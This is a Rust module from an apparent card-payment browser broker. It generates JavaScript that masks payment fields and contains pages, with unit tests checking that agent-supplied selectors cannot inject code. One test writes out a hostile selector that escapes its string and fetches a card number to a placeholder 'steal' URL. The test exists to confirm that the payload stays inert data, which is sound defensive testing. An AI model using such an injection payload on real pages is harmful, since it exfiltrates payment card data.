//! Digit-free JavaScript expressions: the only thing this client will ever
//! hand to `POST /tabs/:id/evaluate` (ADR 0005 Decision 3).
//!
//! `evaluate` publishes **both its expression and its result** on camofox's
//! plugin event bus (spike finding, docs/findings/camofox-spike.md Q2), so an
//! expression that inlines a card value would put that value on the bus. The
//! primitive decision therefore demotes `evaluate` to the two operations that
//! need no card digits at all:
//!
//! * clearing/masking the payment fields before the result screenshot, and
//! * `about:blank` containment (which `/navigate` refuses — spike finding B).
//!
//! [`DigitFreeExpression`] has a private field and no public constructor, so
//! the fill path — the only code that holds card values — **cannot build one**.
//! That is the structural half of "fill uses `/type`, never `evaluate`": it is
//! a type error, not a review finding.
//!
//! # Selectors
//!
//! Selectors are agent-supplied. They are embedded through
//! `serde_json::to_string`, i.e. as a JSON string literal inside a JSON array,
//! so a selector can never break out of the string and become code. That
//! matters here specifically: masking runs *while the card values are still in
//! the DOM*, so a selector that could execute JS would be an exfiltration
//! channel from the page straight back to the agent.

use std::fmt;

/// A JavaScript expression that provably carries no card digits.
///
/// Constructible only by the functions in this module, all of which take
/// selectors or no input at all.
#[derive(Clone, PartialEq, Eq)]
pub struct DigitFreeExpression(String);

impl DigitFreeExpression {
    /// The expression text, for the request body.
    #[must_use]
    pub fn as_str(&self) -> &str {
        &self.0
    }

    /// Wrap generated source. Private so outside modules cannot mint one.
    fn new(source: String) -> Self {
        Self(source)
    }
}

impl fmt::Debug for DigitFreeExpression {
    /// Prints the *shape*, never the script: the expression contains agent
    /// selectors, and keeping it out of logs keeps log hygiene uniform.
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter
            .debug_struct("DigitFreeExpression")
            .field("bytes", &self.0.len())
            .finish()
    }
}

/// Clear every named field and fire the events a merchant page listens for.
///
/// The screenshot that leaves the broker must not contain a card value
/// (US-10, AGENTS.md rule 4), so this runs immediately before the capture.
/// Only selectors are embedded — never a value — because clearing a field does
/// not need to know what was in it.
#[must_use]
pub fn clear_fields(selectors: &[String]) -> DigitFreeExpression {
    let encoded = serde_json::to_string(selectors).unwrap_or_else(|_| "[]".to_string());
    DigitFreeExpression::new(format!(
        "(() => {{
  const selectors = {encoded};
  let cleared = 0;
  for (const selector of selectors) {{
    const input = document.querySelector(selector);
    if (!input) continue;
    input.value = '';
    input.dispatchEvent(new Event('input', {{ bubbles: true }}));
    input.dispatchEvent(new Event('change', {{ bubbles: true }}));
    cleared += 1;
  }}
  return cleared;
}})()"
    ))
}

/// Whether the page looks settled: parsed, complete, and not busy.
///
/// `/wait` is unusable around a submit — it ignores its selector and may click
/// consent dialogs (spike finding C) — so settle detection is a bounded poll of
/// this predicate from the broker side.
#[must_use]
pub fn settle_probe() -> DigitFreeExpression {
    DigitFreeExpression::new(
        "(() => document.readyState === 'complete' && !document.querySelector('[aria-busy=\"true\"]'))()"
            .to_string(),
    )
}

/// Navigate the tab away to `about:blank`, structurally dropping every value
/// the page held (spec §7, US-11).
///
/// `POST /tabs/:id/navigate` rejects `about:blank` (spike finding B), so this
/// is the one navigation that must go through `evaluate`.
#[must_use]
pub fn contain_about_blank() -> DigitFreeExpression {
    DigitFreeExpression::new(
        "(() => { location.replace('about:blank'); return 'contained'; })()".to_string(),
    )
}

#[cfg(test)]
mod tests {
    use super::{clear_fields, contain_about_blank, settle_probe};

    /// Synthetic card values are built at runtime, never written in source
    /// (`script/no-card-digits`, US-14).
    fn sentinel() -> String {
        "4".repeat(16)
    }

    /// The mask expression names the fields and nothing else: no value can
    /// reach the plugin bus through it (ADR 0005 Decision 2.2).
    #[test]
    fn clear_fields_embeds_selectors_only() {
        let selectors = vec!["#card".to_string(), "#cvv".to_string()];
        let expression = clear_fields(&selectors);
        let source = expression.as_str();

        assert!(source.contains("#card"));
        assert!(source.contains("#cvv"));
        assert!(source.contains("input.value = ''"));
        assert!(
            !source.contains(&sentinel()),
            "the mask expression must never contain a card value"
        );
        assert_eq!(expression, clear_fields(&selectors), "generation is stable");
    }

    /// A selector is agent-supplied input. It is embedded as a JSON string, so
    /// a hostile one stays data and can never become executable code.
    #[test]
    fn hostile_selector_cannot_escape_the_expression() {
        let hostile = vec![
            "#card\"]);fetch('https://example.invalid/steal?pan='+document.querySelector('#card').value);(//"
                .to_string(),
        ];
        let expression = clear_fields(&hostile);
        let source = expression.as_str();

        // The selector list is one JSON array literal, and the quotes inside it
        // are escaped — so the payload cannot terminate the string.
        let encoded = serde_json::to_string(&hostile).unwrap_or_default();
        assert!(
            encoded.contains("\\\""),
            "a quote in a selector is escaped, not literal"
        );

        // Everything before the literal is the fixed prologue, and everything
        // after it is the fixed body: the payload has nowhere to become code.
        let start = source.find(&encoded);
        assert!(
            start.is_some(),
            "the selector array is embedded verbatim: {source}"
        );
        let start = start.unwrap_or_default();
        assert!(
            source[..start].ends_with("const selectors = "),
            "the prologue is fixed, not selector-controlled"
        );
        let tail = &source[start + encoded.len()..];
        assert!(tail.starts_with(';'), "the literal ends the statement");
        assert!(
            !tail.contains("fetch(") && !tail.contains("document.querySelector('#card').value"),
            "no part of the hostile selector becomes executable code"
        );
        assert!(source.starts_with("(() => {"), "the wrapper is fixed");
    }

    #[test]
    fn settle_probe_is_digit_free_and_reads_ready_state() {
        let source = settle_probe();
        assert!(source.as_str().contains("readyState"));
        assert!(!source.as_str().contains(&sentinel()));
    }

    /// Containment must use `location.replace` — `/navigate` rejects
    /// `about:blank` (spike finding B).
    #[test]
    fn containment_uses_location_replace() {
        let source = contain_about_blank();
        assert!(source.as_str().contains("location.replace('about:blank')"));
    }

    /// Debug output is a shape, not the script.
    #[test]
    fn debug_does_not_print_the_source() {
        let rendered = format!("{:?}", clear_fields(&["#card".to_string()]));
        assert!(!rendered.contains("#card"), "got {rendered}");
        assert!(rendered.contains("bytes"));
    }
}
